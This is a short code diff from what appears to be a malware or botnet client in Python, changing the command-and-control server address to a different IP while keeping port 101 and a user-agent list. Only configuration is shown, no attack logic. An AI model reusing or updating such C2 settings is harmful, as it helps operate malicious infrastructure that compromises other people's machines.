@@ -9,7 +9,7 @@ import time
 import random
 
 # Configuration
-C2_ADDRESS  = '51.210.69.79'
+C2_ADDRESS  = '185.174.136.133'
 C2_PORT     = 101
 
 base_user_agents = [
